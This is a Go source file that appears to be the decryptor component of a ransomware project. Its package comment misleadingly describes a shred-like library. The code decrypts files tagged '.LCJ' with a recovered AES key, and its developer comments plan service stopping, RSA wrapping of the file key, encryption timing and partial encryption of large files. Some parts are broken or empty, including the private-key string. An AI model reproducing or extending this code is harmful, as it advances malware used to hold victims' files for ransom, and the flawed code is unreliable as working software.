// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// encrypt the key file with RSA public key after creating the key file
// change the key var by another random string at the end of the program
import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"time"
)

var MB150 int = 157286400
var key []byte

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========

func overwriteFile(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}
// ========= ENCRYPT =========

/////////////////////

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func import_private_key() *rsa.PrivateKey{
	//Create the keys
	//priv, pub := GenerateRsaKeyPair()
	// Export the keys to pem string
	var priv_pem string

	// Import the keys from pem string
	priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)

	// Export the newly imported keys
	//priv_parsed_pem := ExportRsaPrivateKeyAsPemStr(priv_parsed)

	return priv_parsed;
}

func decrypt_encryption_key() []byte {
	content, err := ioutil.ReadFile("key")

	if err != nil {
		log.Fatal(err)
	}

	//fmt.Println(string(content))

	private_key := import_private_key()
	decrypted_bytes, err := private_key.Decrypt(
		nil,
		content,
		&rsa.OAEPOptions{Hash: crypto.SHA256})

	if err != nil {
		panic(err)
	}
	return decrypted_bytes
}

func check_key()() {
	_, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		pass() //If not, create one
	} else {
		key = decrypt_encryption_key() //If so, set key as the key found in the file
	}
}

/////////////////////

func decryptFile(inputfile string, outputfile string) {
	z, err := ioutil.ReadFile(inputfile)
	result := decrypt(key, z)
	err = ioutil.WriteFile(outputfile, result, 0755)
	if err != nil { //19111999 : we don't want this
		fmt.Printf("Unable to create decrypted file!\n")
		os.Exit(0)
	}
}

func decodeBase64(b, unecrypted_text []byte, above_150MB bool) []byte {
	data, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		fmt.Printf("Error: Bad Key!\n")
		os.Exit(0)
	}
	if above_150MB {
		return append(data, unecrypted_text...)
	}
	return data
}

func decrypt(key, text []byte) []byte {

	block, err := aes.NewCipher(key)
	Error(err)

	var above_150MB = false
	var not_ciphered_text, ciphered_text, iv []byte

	if len(text) > MB150 {
		ciphered_text	  = text[:10485760]
		not_ciphered_text = text[10485760:]
		above_150MB = true
	}

	if len(text) < aes.BlockSize { // lisandro : try with blank file
		fmt.Printf("Error!\n")
		os.Exit(0)
	}

	if above_150MB {
		iv 	 = ciphered_text[:aes.BlockSize]
		text = ciphered_text[aes.BlockSize:]
	} else {
		iv 	 = text[:aes.BlockSize]
		text = text[aes.BlockSize:]
	}

	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(text, text)
	if above_150MB { return decodeBase64(text, not_ciphered_text, above_150MB)}
	return decodeBase64(text, nil, false)
}

// ========= END ENCRYPT =========

func listdir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}
	return fileList;
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

func pass()(){
	_ = ""
}

func tree(path string)(){
	file_list := listdir(path)

	start := time.Now()
	for _, file := range file_list {
		if is_dir(file){
			continue
		}
		if file[len(file)-4:] != ".LCJ"{
			continue
		}

		decryptFile(file, file[:len(file)-4])
		err := os.Remove(file)
		if err!=nil {
			continue
		}
	}
	elapsed := time.Since(start)
	fmt.Println("All of your files has been decrypted")
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() {
	check_key()
	path := "/root/y"
	tree(path)
}











